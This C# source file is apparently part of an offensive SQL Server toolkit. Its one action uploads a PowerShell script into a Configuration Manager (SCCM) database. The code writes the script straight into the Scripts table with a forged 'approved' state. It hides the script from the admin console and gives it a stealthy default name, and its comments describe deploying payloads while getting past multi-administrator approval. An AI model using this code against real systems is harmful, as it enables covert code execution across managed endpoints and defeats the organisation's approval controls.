// MSSQLand/Actions/ConfigMgr/CMScriptAdd.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.IO;
using System.Text;

namespace MSSQLand.Actions.ConfigMgr
{
    /// <summary>
    /// Upload a PowerShell script to ConfigMgr's Scripts table for later execution via sccm-script-run.
    /// Use this to deploy custom payloads or administrative scripts without admin console approval workflow.
    /// Automatically sets script to approved state and hides it from console UI.
    /// Generates unique GUID for script identification or accepts custom GUID.
    /// Bypasses normal script approval process requiring multiple administrator roles.
    /// Returns script GUID needed for sccm-script-run command.
    /// </summary>
    internal class CMScriptAdd : BaseAction
    {
        [ArgumentMetadata(Position = 0, ShortName = "f", LongName = "file", Description = "PowerShell script file path", Required = true)]
        private string _scriptFile;

        [ArgumentMetadata(Position = 1, ShortName = "n", LongName = "name", Description = "Script name (default: auto-generated)")]
        private string _scriptName;

        [ArgumentMetadata(Position = 2, ShortName = "g", LongName = "guid", Description = "Script GUID (auto-generated if not provided)")]
        private string _scriptGuid;

        public override void ValidateArguments(string[] args)
        {
            var (named, positional) = ParseActionArguments(args);

            // File argument (required)
            _scriptFile = GetNamedArgument(named, "f", null) 
                       ?? GetNamedArgument(named, "file", null)
                       ?? GetPositionalArgument(positional, 0);

            if (string.IsNullOrWhiteSpace(_scriptFile))
            {
                throw new ArgumentException("Script file path is required (--file or -f)");
            }

            // Name argument (optional, auto-generate stealth name if not provided)
            _scriptName = GetNamedArgument(named, "n", null)
                       ?? GetNamedArgument(named, "name", null)
                       ?? GetPositionalArgument(positional, 1)
                       ?? $"CMDeploy0{new Random().Next(0, 10)}";

            // GUID argument (optional, auto-generate if not provided)
            _scriptGuid = GetNamedArgument(named, "g", null)
                       ?? GetNamedArgument(named, "guid", null)
                       ?? GetPositionalArgument(positional, 2)
                       ?? Guid.NewGuid().ToString().ToUpper();
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Adding ConfigMgr script: {_scriptName}");

            CMService sccmService = new(databaseContext.QueryService, databaseContext.Server);

            var databases = sccmService.GetSccmDatabases();

            if (databases.Count == 0)
            {
                Logger.Warning("No ConfigMgr databases found");
                return null;
            }

            // Read script content
            string scriptContent;
            try
            {
                scriptContent = File.ReadAllText(_scriptFile);
            }
            catch (FileNotFoundException)
            {
                Logger.Error($"Script file not found: {_scriptFile}");
                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to read script file: {ex.Message}");
                return null;
            }

            foreach (string db in databases)
            {
                string siteCode = CMService.GetSiteCode(db);
                Logger.Info($"ConfigMgr database: {db} (Site Code: {siteCode})");

                try
                {
                    // Encode script as UTF-16 with BOM
                    byte[] scriptBytes = Encoding.Unicode.GetBytes(scriptContent);
                    string scriptHex = BitConverter.ToString(scriptBytes).Replace("-", "");

                    // Calculate SHA256 hash
                    string scriptHash = Misc.ComputeSHA256(scriptBytes);

                    string insertQuery = $@"
INSERT INTO [{db}].dbo.Scripts 
(ScriptGuid, ScriptVersion, ScriptName, Script, ScriptType, Approver, ApprovalState, Feature, Author, LastUpdateTime, ScriptHash, Comment, ScriptDescription) 
VALUES 
('{_scriptGuid}', 1, '{_scriptName.Replace("'", "''")}', 0x{scriptHex}, 0, 'CM', 3, 1, 'CM', '', '{scriptHash}', '', '')";

                    databaseContext.QueryService.ExecuteNonProcessing(insertQuery);

                    Logger.Success($"Script added successfully");
                    Logger.InfoNested($"Script GUID: {_scriptGuid}");
                    Logger.InfoNested($"Script Name: {_scriptName}");
                    Logger.InfoNested($"Script Hash: {scriptHash}");
                    Logger.InfoNested($"Auto-approved and hidden from console");
                }
                catch (Exception ex)
                {
                    Logger.Error($"Failed to add script: {ex.Message}");
                }
            }

            return null;
        }
    }
}
